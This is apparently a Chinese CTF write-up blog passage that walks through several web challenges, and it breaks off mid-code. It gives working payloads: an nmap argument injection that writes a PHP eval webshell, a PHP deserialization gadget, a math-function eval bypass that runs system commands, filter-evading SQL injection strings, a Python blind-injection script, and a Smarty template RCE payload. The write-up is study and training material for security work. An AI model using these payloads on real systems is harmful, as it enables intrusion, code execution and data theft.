alt="image-20230408213113606"></p><p>本地测试了一些，nmap保存文件的方法</p><p>真刑啊，文件的后缀可以自己决定，文件内容里还包含了我们输入的查询内容。</p><p>回到题目，之前我们猜测了nmap 127.0.0.1 -oX ./xml/????</p><p>其中127.0.0.1是我们控制的，那我们尝试改成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;?php eval($_POST[&quot;pwd&quot;]);?&gt; -oG 1.php&#x27;</span></span><br></pre></td></tr></table></figure><p>测试后发现被拦截了，可能是PHP关键字被拦截了，也可能是oG被禁用了，先试着绕php，后缀可以将php改成phtml</p><p>文件的内容&lt;?php中的PHP如何替换上网去查了一下，解决方法是使用短标签&lt;?=</p><p>最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &lt;?= @eval($_POST[&quot;pwd&quot;]);?&gt; -oG 1.phtml &#x27;</span></span><br></pre></td></tr></table></figure><p>进行了escapeshellarg()与escapeshellcmd()函数处理保护，没法产生文件</p><p>这就是为什么要加引号的原因</p><p>这和之前的一题有点像 </p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>题目</p><p><img src="../images/image-20230408213950745.png" alt="image-20230408213950745"></p><p>查看源码发现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">enc</span>(<span class="params">code</span>)&#123;</span><br><span class="line">  hash = <span class="title function_">hex_md5</span>(code);</span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> code = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;vcode&quot;</span>).<span class="property">value</span>;</span><br><span class="line">  <span class="keyword">if</span> (code != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">hex_md5</span>(code) == <span class="string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;</span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">&quot;您通过了验证！&quot;</span>);</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;./flag.php&quot;</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">&quot;你的授权码不正确！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;请输入授权码&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就直接去访问flag.php</p><p><img src="../images/image-20230408214236511.png" alt="image-20230408214236511"></p><p>这两点进行了提示</p><p><img src="../images/image-20230408214359417.png" alt="image-20230408214359417"></p><p>最后拿到了flag</p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>题目</p><p><img src="../images/image-20230408214513042.png" alt="image-20230408214513042"></p><p><img src="../images/image-20230408214635383.png" alt="image-20230408214635383"></p><p>发现了题目给的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2023</span>-<span class="number">04</span>-<span class="number">08</span> <span class="number">01</span>:<span class="number">46</span>:<span class="number">38</span></span><br></pre></td></tr></table></figure><p>这里话直接构造system(xxxx)的话是不行的，因为system被过滤了</p><p>首先这里需要利用<a href="https://so.csdn.net/so/search?q=assert&amp;spm=1001.2101.3001.7020">assert</a>函数，assert会判断应该表达式是否成立，返回true或false，is_numeric函数将检测变量是否为数字或数字字符串，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230408215138117.png" alt="image-20230408215138117"></p><p>phpinfo(true)   或者   phpinfo(1)  都是可以直接执行的    还有一个小知识点  phpinfo() 执行是会返回1的   也就是true</p><p><img src="../images/image-20230408215820893.png" alt="image-20230408215820893"></p><p>也是会执行的</p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//if(isset($_GET[&#x27;source&#x27;]))&#123;highlight_file(__FILE__);die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]); </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和ctfshow里面的一道题几乎一模一样，就是考查利用函数的转化来进行做题</p><p><strong>就是使用GET逃逸来进行做题</strong></p><p>80个字符比较少，想办法构造<script type="math/tex">_GET[1]`再传参getflag，但是其实发现构造这个好像更难。。。因为`</script>、<code>_</code>、<code>[</code>、<code>]</code>都不能用，同时<code>GET</code>必须是大写，很难直接构造。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>)&#123;pi&#125;((<span class="variable">$$pi</span>)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36) =&gt; &quot;hex2bin&quot; </span><br><span class="line">dechex(1598506324) =&gt; &quot;5f474554&quot; </span><br><span class="line">$pi=hex2bin(&quot;5f474554&quot;) =&gt; $pi=&quot;_GET&quot;   //hex2bin将一串16进制数转换为二进制字符串 </span><br><span class="line">($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) =&gt; ($_GET)&#123;pi&#125;($_GET)&#123;abs&#125;  //&#123;&#125;可以代替[]</span><br></pre></td></tr></table></figure><p><a href="https://johnfrod.top/ctf/%E5%88%A9%E7%94%A8%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">四种方法</a></p><h2 id="SWPU2019-Web1-sql注入"><a href="#SWPU2019-Web1-sql注入" class="headerlink" title="[SWPU2019]Web1(sql注入)"></a>[SWPU2019]Web1(sql注入)</h2><p>题目</p><p><img src="../images/image-20230410164651863.png" alt="image-20230410164651863"></p><p>一个登录框</p><p>这里尝试进行注册后，发现admin用户已经存在，所以就尝试自己注册一个账号进行登录</p><p><img src="../images/image-20230410164906595.png" alt="image-20230410164906595"></p><p>登录界面</p><p>用万能密码进行测试的时候发现</p><p><img src="../images/image-20230410165107656.png" alt="image-20230410165107656"></p><p>fuzz测试结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">空格被替换为空</span><br><span class="line">or</span><br><span class="line">and</span><br><span class="line">join</span><br><span class="line">--+</span><br><span class="line">#</span><br><span class="line">updatexml</span><br><span class="line">extractvalue</span><br><span class="line">exp</span><br><span class="line">floor</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>所以不能用注释之后，我们就尝试进行闭合</p><p><img src="../images/image-20230410165855329.png" alt="image-20230410165855329"></p><p>先需要判断有多少字段，<code>order by</code>不能使用，可以使用<code>group by</code>或者<code>into @a, @b, @c, ...</code></p><p>发布广告（’ or 1=1）进行尝试，进行测试时发现空格、or、#、—+、and等进行了过滤，目前基本可以确定注入点在这个地方，在进行注入的时候我们需要先判断列数，payload：1’/<strong>/group/</strong>/by/**/n,’，n为整数（因为对or进行了过滤，导致order无法使用，因此这里才采用group by来确定列数），最终得到n为22，结果如下：</p><p><img src="../images/image-20230410170426061.png" alt="image-20230410170426061"></p><p>发现一共有23列，那么我们就尝试一下看哪有回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410170529355.png" alt="image-20230410170529355"></p><p>发现23位置有回显，那么我们就利用这两个位置来进行查询</p><p><strong>查数据库</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=&#x27;union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410171102690.png" alt="image-20230410171102690"></p><p>查出数据库名，因为or被过滤了</p><p>查表名，因为这里过滤<code>or</code>所以也无法使用<code>information_schema</code>表，也没有<code>sys</code>表，所以使用<code>mysql.innodb_table_stats</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=&#x27;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22&amp;content=mochu7&amp;ac=add</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410171219143.png" alt="image-20230410171219143"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8、进行匿名获取flag值，payload：1&#x27;/**/union/**/select/**/1,(select/**/group_concat(c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1，或者payload：1&#x27;/**/union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1，其中group_concat(参数)，对参数进行修改，访问每一个字段，结果如下：</span><br></pre></td></tr></table></figure><p>这里有一个小知识点就是group_concat(`3`)里的3和外面查询的别名是一样的，就是</p><p>3必须是表里必须有三列，然后必须早select 1，2，3xxx这里进行查询</p><p><img src="../images/image-20230410173317416.png" alt="image-20230410173317416"></p><p>本地也进行测试过了</p><p><img src="../images/image-20230410173337170.png" alt="image-20230410173337170"></p><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>题目</p><p><img src="../images/image-20230410173453240.png" alt="image-20230410173453240"></p><p><img src="../images/image-20230410174811347.png" alt="image-20230410174811347"></p><p>题目中也有XFF，然后请求头中并没有，所以我们尝试抓包看看</p><p>发现没有，然后添加查看，发现这里可以进行回显</p><p><img src="../images/image-20230410175020518.png" alt="image-20230410175020518"></p><p>这里和之前的一道题很像，就是利用这里来进行命令执行，但是之前的题是ssti的，并且是一个模板的rce</p><p>所以我们就猜测这里会不会也是考模板的ssti</p><p><img src="../images/image-20230410175234890.png" alt="image-20230410175234890"></p><p>对这个玩意眼熟吧</p><p><img src="../images/image-20230410175258323.png" alt="image-20230410175258323"></p><p>于是就去找这个模板的rce</p><p><a href="https://www.venustech.com.cn/new_type/aqtg/20210226/22409.html">文章wp</a></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)&#125;</span><br></pre></td></tr></table></figure><p>得执行两次才行</p><p><img src="../images/image-20230410175551036.png" alt="image-20230410175551036"></p><p><img src="../images/image-20230410175712890.png" alt="image-20230410175712890"></p><p>还是点两次发送就行</p><p><img src="../images/image-20230410175728695.png" alt="image-20230410175728695"></p><p><strong>CVE-2021-26120</strong></p><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>题目</p><p><img src="../images/image-20230410194457013.png" alt="image-20230410194457013"></p><p>这里进行了简单的提示</p><p>就是考察的是sql盲注</p><p>提示很明显，需要SQL盲注<br>这道题的注入点不是登录框，而是上面的数字按钮<br>在登录框测试能否注入的时候，返回值没有显示错误</p><p><img src="../images/image-20230410194738135.png" alt="image-20230410194738135"></p><p>注入点在上面的数字处，那里才是注入点</p><p><img src="../images/image-20230410194911976.png" alt="image-20230410194911976"></p><p><strong>paylaod</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://e4247cff-5d64-4353-b875-e07e478c50bf.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="comment"># 中间的语句为真，网页不报错，中间的语句为假，网页报错，根据这个判断</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        database = <span class="string">&quot;?id=1^(ord(substr((select(database())),%d,1))&gt;%d)^1&quot;</span> % (i, mid)</span><br><span class="line">        <span class="comment"># 查表</span></span><br><span class="line">        tables = <span class="string">&quot;?id=1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;</span>%(i,j)</span><br><span class="line">        columns = <span class="string">&quot;?id=1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;</span>%(i,j)</span><br><span class="line">        data = <span class="string">&quot;?id=1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span> % (i, j)</span><br><span class="line">        <span class="comment"># 根据需要查询的内容改变get中的参数</span></span><br><span class="line">        r = requests.get(url=url+database)</span><br><span class="line">        <span class="comment"># print(url+database)</span></span><br><span class="line">        <span class="comment"># print(payload1)</span></span><br><span class="line">        <span class="comment"># print(r.raw)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Click&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="comment"># print(low,mid,high)</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(low)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>记得不知道过滤啥的时候进行抓包fuzz测试一下</p><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>题目</p><p><img src="../images/image-20230410195215842.png" alt="image-20230410195215842"></p><p><img src="../images/image-20230410195245734.png" alt="image-20230410195245734"></p><p>查看源码就行</p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 